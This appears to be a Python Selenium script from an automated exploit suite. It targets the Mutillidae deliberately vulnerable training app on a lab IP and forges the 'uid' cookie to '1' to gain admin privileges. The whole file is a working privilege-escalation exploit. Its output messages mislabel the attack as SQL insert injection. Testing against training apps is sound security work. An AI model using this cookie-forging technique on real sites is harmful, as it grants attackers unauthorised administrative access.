from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from time import sleep
from modules.SeleniumDrivers import FirefoxBrowser


def privilege_escalation_via_cookie_into_uid(
    ip="192.168.255.133",
    sleep_time=0,
    payload="1",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=privilege-escalation.php")
        initial_cookies = browser.get_cookies()
        print("Initial cookies:", initial_cookies)
        browser.add_cookie({"name": "uid", "value": payload, "path": "/"})
        browser.refresh()
        updated_cookies = browser.get_cookies()
        print("Updated cookies:", updated_cookies)
        sleep(sleep_time)
        if verify_default_payload:
            element = browser.find_element(By.ID, "idSystemInformationHeading")
            print(f'Output of the payload: {element.get_attribute("innerHTML")}')
            if "Logged In Admin" in element.get_attribute("innerHTML"):
                print("SQL injection - Insert injection succeeded")
                return True
            else:
                print("SQL injection - Insert injection failed")
                return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()
